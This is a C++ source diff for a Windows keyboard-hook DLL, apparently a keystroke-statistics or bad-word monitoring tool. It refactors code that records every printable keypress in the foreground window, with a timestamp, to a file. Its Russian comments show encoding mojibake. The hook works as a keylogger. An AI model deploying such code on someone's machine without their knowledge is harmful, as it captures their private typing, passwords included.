@@ -2,18 +2,14 @@
 #include "framework.h"
 #include "kbhookproc.h"
 
-std::string statsPath = "";
-std::string modPath = "";
-std::string badWords = "";
-
 extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath) {
-	statsPath = newPath;
+	WordOfVkeys::GetInstance()->SetWhereToWriteKeys(newPath);
 }
 extern "C" KBHOOKPROC_API void SetModPath(std::string newPath) {
-	modPath = newPath;
+	WordOfVkeys::GetInstance()->SetWhereToWriteWords(newPath);
 }
 extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath) {
-	badWords = newPath;
+	WordOfVkeys::GetInstance()->SetWhereToReadBadWords(newPath);
 }
 
 extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
@@ -22,52 +18,92 @@ extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
 	_In_ LPARAM lParam
 )
 {
-	if(code < 0 ||
-		wParam == VK_CONTROL ||
-		wParam == VK_MENU || 
-		wParam == VK_CAPITAL || 
-		wParam == VK_SHIFT)
+	WordOfVkeys* currWorld = WordOfVkeys::GetInstance();
+
+	if (code < 0 ||
+		currWorld->IsUnPrintableKey(wParam) ||
+		!currWorld->IsKeyDownState(lParam)) 
+	{
 		return CallNextHookEx(NULL, code, wParam, lParam);
-
-	if (lParam & 1<<31) {// 31bit keyDown
-
-		//активный поток
-		DWORD processId;
-		DWORD activeThread = GetWindowThreadProcessId(
-			GetForegroundWindow(), &processId);
-
-		//раскладка клавиатуры в активном потоке
-		auto kbLayout = GetKeyboardLayout(activeThread);
-
-
-		UINT uScanCode = MapVirtualKeyEx(wParam, 0, kbLayout);
-		BYTE keysState[256];
-		WORD keySymbol;
-		//состо€ние всех клавиш
-		GetKeyboardState(keysState);
-
-		//перевод vk_key или scan_code в символ с учетом раскладки (регистр не учитываетс€!)
-		ToAsciiEx(wParam, uScanCode, keysState, &keySymbol, 0, kbLayout);
-		char  charSymbol = char(keySymbol);
-
-		//провер€ем шифт и капслок (дл€ регистра)
-		if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
-			(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
-			charSymbol = toupper(charSymbol);
-
-		//получаем текущее врем€
-		auto start = std::chrono::system_clock::now();
-
-		std::time_t end_time = std::chrono::system_clock::to_time_t(start);
-		char timeBuff[50];
-		ctime_s(timeBuff, sizeof(timeBuff), &end_time);
-
-		//пишем в файл
-		std::ofstream ofs(statsPath, std::ofstream::out | std::ofstream::app);
-		ofs << "'" << charSymbol << "'" << " : " << timeBuff;
-		ofs.close();
-
 	}
-	// CallNextHookEx чтобы остальные приложени€ могли ловить этот хук (проикдываем дальше)
+
+	currWorld->AddVkeyToWord(wParam);
+
 	return CallNextHookEx(NULL, code, wParam, lParam);
+}
+
+WordOfVkeys* WordOfVkeys::_instance = nullptr;
+
+bool WordOfVkeys::IsUnPrintableKey(WPARAM vkey)
+{
+	if (
+		vkey == VK_CONTROL ||
+		vkey == VK_MENU ||
+		vkey == VK_CAPITAL ||
+		vkey == VK_SHIFT)
+		return true;
+
+	return false;
+}
+bool WordOfVkeys::IsKeyDownState(LPARAM vkeyAttr)
+{
+	return vkeyAttr & 1 << 31;
+}
+
+void WordOfVkeys::AddVkeyToWord(WPARAM vkey)
+{
+	//раскладка клавиатуры в активном потоке
+	auto kbLayout = GetCurrentLayout();
+	auto keySymb = GetCharSymbFromVkey(vkey, kbLayout);
+	std::string currTime = GetCurrTimeBuff();
+
+	std::string info = "'" + std::string(1, keySymb) + "' : " + currTime;
+	WriteTofile(_whereToWriteKeys, info);
+}
+
+HKL WordOfVkeys::GetCurrentLayout() {
+	//активный поток
+	DWORD processId;
+	DWORD activeThread = GetWindowThreadProcessId(
+		GetForegroundWindow(), &processId);
+
+	//раскладка клавиатуры в активном потоке
+	auto kbLayout = GetKeyboardLayout(activeThread);
+
+	return kbLayout;
+}
+std::string WordOfVkeys::GetCurrTimeBuff() {
+	//получаем текущее врем€
+	auto start = std::chrono::system_clock::now();
+
+	std::time_t end_time = std::chrono::system_clock::to_time_t(start);
+	char timeBuff[50];
+	ctime_s(timeBuff, sizeof(timeBuff), &end_time);
+
+	return timeBuff;
+}
+char WordOfVkeys::GetCharSymbFromVkey(WPARAM vkey, HKL kbLayout) {
+
+	UINT uScanCode = MapVirtualKeyEx(vkey, 0, kbLayout);
+	BYTE keysState[256];
+	WORD keySymbol;
+	//состо€ние всех клавиш
+	GetKeyboardState(keysState);
+
+	//перевод vk_key или scan_code в символ с учетом раскладки (регистр не учитываетс€!)
+	ToAsciiEx(vkey, uScanCode, keysState, &keySymbol, 0, kbLayout);
+	char charSymbol = char(keySymbol);
+
+	//провер€ем шифт и капслок (дл€ регистра)
+	if ((GetAsyncKeyState(VK_SHIFT) && !GetAsyncKeyState(VK_CAPITAL)) ||
+		(!GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState(VK_CAPITAL)))
+		charSymbol = toupper(charSymbol);
+
+	return charSymbol;
+}
+
+void WordOfVkeys::WriteTofile(std::string fileName, std::string info) {
+	std::ofstream ofs(fileName, std::ofstream::out | std::ofstream::app);
+	ofs << info;
+	ofs.close();
 }
